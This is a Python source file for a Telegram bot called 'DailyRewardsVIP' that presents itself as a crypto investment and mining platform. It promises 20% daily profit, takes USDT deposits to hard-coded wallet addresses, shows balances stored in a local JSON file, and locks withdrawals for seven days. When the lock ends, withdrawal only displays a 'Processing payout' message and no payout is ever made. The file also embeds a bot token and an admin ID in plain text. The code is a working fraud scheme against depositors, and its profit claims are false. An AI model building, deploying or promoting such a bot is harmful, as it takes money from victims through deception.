import telebot
from telebot import types
import json
import os
import time
from concurrent.futures import ThreadPoolExecutor
from flask import Flask
import threading

TOKEN = "8910375655:AAFqjpzn21RoficAFnR70Aut9nRI35MyKN4"
ADMIN_ID = "5738022147"

bot = telebot.TeleBot(TOKEN)
DB = "vip_users_admin_v1.json"

# ThreadPool for fast concurrent user responses
executor = ThreadPoolExecutor(max_workers=50)

BANNER_IMAGE = "https://images.unsplash.com/photo-1611974789855-9c2a0a7236a3?w=600"

WALLETS = {
    "TRC20": "TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs",
    "BEP20": "0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0",
    "ERC20": "0xe4484af8794b0fe2eccf433f7da7ac81935fc4a0"
}

INVESTMENT_PLANS = [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]
user_step = {}

# --- FLASK WEB SERVER FOR RENDER WEB SERVICE PORT BINDING ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running and active 24/7!"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
# ------------------------------------------------------------

def load():
    if not os.path.exists(DB) or os.path.getsize(DB) == 0:
        with open(DB, "w") as f:
            json.dump({}, f)
        return {}
    try:
        with open(DB, "r") as f:
            content = f.read().strip()
            if not content:
                return {}
            return json.loads(content)
    except Exception:
        with open(DB, "w") as f:
            json.dump({}, f)
        return {}

def save(data):
    try:
        with open(DB, "w") as f:
            json.dump(data, f, indent=4)
    except Exception:
        pass

def register(user):
    data = load()
    uid = str(user.id)
    if uid not in data:
        data[uid] = {
            "name": user.first_name,
            "username": user.username or "Not set",
            "balance": 0.0,
            "active_deposit": 0.0,
            "profit": 0.0,
            "history": [],
            "deposit_time": 0,
            "last_profit": int(time.time()),
            "status": "No Deposit"
        }
        save(data)

def add_profit(uid):
    data = load()
    if uid in data and data[uid]["active_deposit"] > 0:
        now = int(time.time())
        if now - data[uid].get("last_profit", now) >= 86400:
            daily_profit = data[uid]["active_deposit"] * 0.20
            data[uid]["balance"] += daily_profit
            data[uid]["profit"] += daily_profit
            data[uid]["last_profit"] = now
            save(data)

def main_reply_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(
        types.KeyboardButton("👤 My Profile"),
        types.KeyboardButton("💰 Deposit")
    )
    kb.add(
        types.KeyboardButton("📈 Mining"),
        types.KeyboardButton("💸 Withdraw")
    )
    kb.add(
        types.KeyboardButton("📜 History"),
        types.KeyboardButton("🎁 Referral")
    )
    kb.add(
        types.KeyboardButton("🛠 Support")
    )
    return kb

@bot.message_handler(commands=["start"])
def start(message):
    executor.submit(handle_start_background, message)

def handle_start_background(message):
    uid = str(message.from_user.id)
    register(message.from_user)
    add_profit(uid)

    text = (
        "🏦 *Welcome to DailyRewardsVIP*\n\n"
        f"👋 Hello {message.from_user.first_name}\n\n"
        "💎 Official Investment & Mining Platform\n"
        "📌 *Terms:* Deposits & Profits are locked for 7 days before withdrawal becomes available. Daily Profit: 20%.\n\n"
        "Choose an option from the menu below:"
    )
    try:
        bot.send_photo(message.chat.id, BANNER_IMAGE)
    except Exception:
        pass

    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=main_reply_menu())

@bot.message_handler(content_types=['photo', 'text', 'document', 'video', 'audio', 'sticker'])
def handle_messages(message):
    executor.submit(process_message_thread, message)

def process_message_thread(message):
    uid = str(message.from_user.id)
    user_name = message.from_user.first_name
    username = message.from_user.username or "Not set"
    data = load()

    if uid not in data:
        register(message.from_user)
        data = load()

    # --- STRICT CHECK: WAITING ONLY FOR TRANSACTION SCREENSHOT ---
    if uid in user_step and user_step[uid].get("state") == "waiting_for_screenshot":
        if message.content_type == 'photo':
            screenshot = message.photo[-1].file_id
            amount = user_step[uid]["amount"]
            network = user_step[uid]["network"]

            data[uid]["history"].append({
                "amount": amount,
                "network": network,
                "status": "Pending ⏳"
            })
            data[uid]["status"] = "Pending ⏳"
            save(data)

            bot.send_message(
                message.chat.id,
                "⏳ *Payment Verification Submitted Successfully!*\n\n"
                "Your deposit is now under review. Please wait **10 to 30 minutes** while our finance team verifies your transaction receipt.",
                parse_mode="Markdown",
                reply_markup=main_reply_menu()
            )

            # Professional admin control panel with clear warning regarding fake/invalid receipts
            admin_kb = types.InlineKeyboardMarkup(row_width=2)
            admin_kb.add(
                types.InlineKeyboardButton("✅ Approve", callback_data=f"adm_app_{uid}_{amount}"),
                types.InlineKeyboardButton("❌ Reject (Fake/Invalid)", callback_data=f"adm_can_{uid}")
            )

            admin_text = (
                f"🔔 *NEW DEPOSIT VERIFICATION REQUEST*\n\n"
                f"👤 Telegram Name: {user_name}\n"
                f"🔗 Username: @{username}\n"
                f"🆔 Telegram User ID: `{uid}`\n"
                f"💵 Amount: ${amount}\n"
                f"💳 Network: {network}\n\n"
                f"⚠️ *Strict Admin Warning:* Inspect the attached receipt carefully. If it is blurry, fake, or unrelated to a real transaction, click *Reject* immediately."
            )
            try:
                bot.send_photo(int(ADMIN_ID), screenshot, caption=admin_text, parse_mode="Markdown", reply_markup=admin_kb)
            except Exception as e:
                print(f"Error sending to admin: {e}")

            user_step.pop(uid, None)
            return
        else:
            bot.send_message(
                message.chat.id,
                "❌ *Invalid Submission!*\n\nYou must upload a valid transaction **Screenshot** image. Text, documents, or other media are strictly blocked until a proper receipt is provided."
            )
            return

    text = message.text

    if text == "👤 My Profile":
        user = data[uid]
        lock_status = "Unlocked ✅"
        if user['deposit_time'] > 0:
            elapsed = int(time.time()) - user['deposit_time']
            remaining_days = (7 * 86400) - elapsed
            if remaining_days > 0:
                days_left = remaining_days // 86400
                hours_left = (remaining_days % 86400) // 3600
                lock_status = f"Locked 🔒 ({days_left}d {hours_left}h left)"

        txt = (
            "👤 *PROFILE*\n\n"
            f"🆔 ID: `{uid}`\n"
            f"👤 Name: {user['name']}\n"
            f"💰 Balance: ${user['balance']:.2f}\n"
            f"💵 Active Deposit: ${user['active_deposit']:.2f}\n"
            f"📈 Total Profit: ${user['profit']:.2f}\n"
            f"⏳ Status: {user['status']}\n"
            f"🔐 Withdrawal Lock: {lock_status}"
        )
        bot.send_message(message.chat.id, txt, parse_mode="Markdown", reply_markup=main_reply_menu())

    elif text == "💰 Deposit":
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(
            types.InlineKeyboardButton("🟢 USDT TRC20", callback_data="net_TRC20"),
            types.InlineKeyboardButton("🟡 USDT BEP20", callback_data="net_BEP20"),
            types.InlineKeyboardButton("🔵 USDT ERC20", callback_data="net_ERC20")
        )
        bot.send_message(message.chat.id, "💰 *Select Deposit Network below:*", parse_mode="Markdown", reply_markup=kb)

    elif text == "📈 Mining":
        bot.send_message(
            message.chat.id,
            "⛏ *Daily Mining Active*\n\nYour active deposit generates 20% daily profit automatically. Locked for 7 days.",
            parse_mode="Markdown",
            reply_markup=main_reply_menu()
        )

    elif text == "💸 Withdraw":
        user = data[uid]
        if user['deposit_time'] == 0:
            bot.send_message(message.chat.id, "❌ You have no active deposit to withdraw from.", reply_markup=main_reply_menu())
            return
        
        elapsed = int(time.time()) - user['deposit_time']
        if elapsed < (7 * 86400):
            days_left = ((7 * 86400) - elapsed) // 86400
            hours_left = (((7 * 86400) - elapsed) % 86400) // 3600
            bot.send_message(message.chat.id, f"❌ *Withdrawal Locked!*\n\nPer terms and conditions, you cannot withdraw until 7 days are complete. Time remaining: approx *{days_left} days and {hours_left} hours*.", parse_mode="Markdown", reply_markup=main_reply_menu())
        else:
            bot.send_message(message.chat.id, "💸 Withdrawal system is now unlocked for you! Processing payout...", reply_markup=main_reply_menu())

    elif text == "📜 History":
        history = data[uid].get("history", [])
        if not history:
            bot.send_message(message.chat.id, "📜 No deposit history yet.", reply_markup=main_reply_menu())
        else:
            hist_text = "📜 *Deposit History*\n\n"
            for i in history:
                hist_text += f"💵 ${i['amount']} | Network: {i['network']} | Status: *{i['status']}*\n"
            bot.send_message(message.chat.id, hist_text, parse_mode="Markdown", reply_markup=main_reply_menu())

    elif text == "🎁 Referral":
        bot.send_message(
            message.chat.id,
            f"🎁 *Referral System*\n\nInvite Link:\nhttps://t.me/DailyRewardsVIP_bot?start={uid}",
            parse_mode="Markdown",
            reply_markup=main_reply_menu()
        )

    elif text == "🛠 Support":
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("💬 Contact Admin", url=f"tg://user?id={ADMIN_ID}"))
        support_txt = (
            "🛠 *SUPPORT PANEL*\n\n"
            "If you have any questions, transaction delays, or issues regarding your account, please click the button below to message the admin directly."
        )
        bot.send_message(message.chat.id, support_txt, parse_mode="Markdown", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: call.data.startswith("net_"))
def callback_network(call):
    network = call.data.split("_")[1]
    uid = str(call.from_user.id)
    if uid not in user_step:
        user_step[uid] = {}
    user_step[uid]["network"] = network
    bot.answer_callback_query(call.id)

    kb = types.InlineKeyboardMarkup(row_width=2)
    for amount in INVESTMENT_PLANS:
        kb.add(types.InlineKeyboardButton(f"💵 ${amount} (20% Daily)", callback_data=f"plan_{amount}"))

    bot.send_message(
        call.message.chat.id,
        f"💰 Network: *{network}*\n\nPlease select your investment plan ($10 to $100):",
        parse_mode="Markdown",
        reply_markup=kb
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("plan_"))
def callback_plan(call):
    uid = str(call.from_user.id)
    amount = int(call.data.split("_")[1])
    
    if uid not in user_step:
        user_step[uid] = {}
    if "network" not in user_step[uid]:
        user_step[uid]["network"] = "TRC20"

    user_step[uid]["amount"] = amount
    network = user_step[uid]["network"]

    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_pay"))

    wallet_address = WALLETS.get(network, WALLETS["TRC20"])

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"📌 *Deposit Summary*\n💳 Network: *{network}*\n💵 Amount: *${amount}*\n\n📬 *Send exact funds to this wallet:*\n`{wallet_address}`\n\n*Terms:* After transferring funds from your external wallet, click the button below to submit your payment proof.",
        parse_mode="Markdown",
        reply_markup=kb
    )

@bot.callback_query_handler(func=lambda call: call.data == "confirm_pay")
def callback_confirm(call):
    uid = str(call.from_user.id)
    bot.answer_callback_query(call.id)

    if uid not in user_step or "amount" not in user_step[uid]:
        user_step[uid] = {"amount": 50, "network": "TRC20"}

    # Strictly lock user to screenshot upload state only
    user_step[uid]["state"] = "waiting_for_screenshot"

    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text="📸 *Payment Confirmation Step*\n\nPlease upload and send a clear **Transaction Screenshot** image right here. Fake, blurry, or unrelated images will be rejected by the administration.",
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
def admin_actions(call):
    if str(call.from_user.id) != str(ADMIN_ID):
        bot.answer_callback_query(call.id, "❌ You are not authorized as Admin!", show_alert=True)
        return

    parts = call.data.split("_")
    action = parts[1]
    uid = parts[2]

    data = load()
    if uid not in data:
        bot.answer_callback_query(call.id, "❌ User data not found!", show_alert=True)
        return

    if action == "app":
        amount = float(parts[3])
        data[uid]["active_deposit"] += amount
        data[uid]["balance"] += amount
        data[uid]["deposit_time"] = int(time.time())
        data[uid]["status"] = "Approved ✅"
        
        if data[uid]["history"]:
            data[uid]["history"][-1]["status"] = "Approved ✅"
        save(data)

        bot.answer_callback_query(call.id, "Deposit Approved Successfully!")
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=f"{call.message.caption}\n\n✅ *Status: APPROVED SUCCESSFULLY BY ADMIN*",
                parse_mode="Markdown"
            )
        except Exception:
            pass

        try:
            bot.send_message(
                int(uid),
                f"🎉 *Deposit Successfully Approved!* 🚀\n\n"
                f"Your deposit of ${amount} has been verified and approved by the administrator.\n"
                f"Your balance and active deposit have been successfully updated!",
                parse_mode="Markdown",
                reply_markup=main_reply_menu()
            )
        except Exception:
            pass

    elif action == "can":
        data[uid]["status"] = "Cancelled ❌"
        if data[uid]["history"]:
            data[uid]["history"][-1]["status"] = "Cancelled ❌"
        save(data)

        bot.answer_callback_query(call.id, "Deposit Rejected!")
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=f"{call.message.caption}\n\n❌ *Status: REJECTED (FAKE/INVALID RECEIPT)*",
                parse_mode="Markdown"
            )
        except Exception:
            pass

        try:
            bot.send_message(
                int(uid),
                "❌ *Your Deposit request was rejected!* \nReason: The uploaded image was identified as fake, blurry, or an invalid transaction receipt. Please make sure to submit a genuine and clear payment screenshot.",
                parse_mode="Markdown",
                reply_markup=main_reply_menu()
            )
        except Exception:
            pass

if __name__ == "__main__":
    # Start Flask server in a background thread so it satisfies Render Web Service port requirements
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    while True:
        try:
            print("Bot is running with Multi-threading and Flask Server support 24/7...")
            bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=20)
        except Exception as e:
            print(f"Error: {e}. Reconnecting...")
            time.sleep(1)
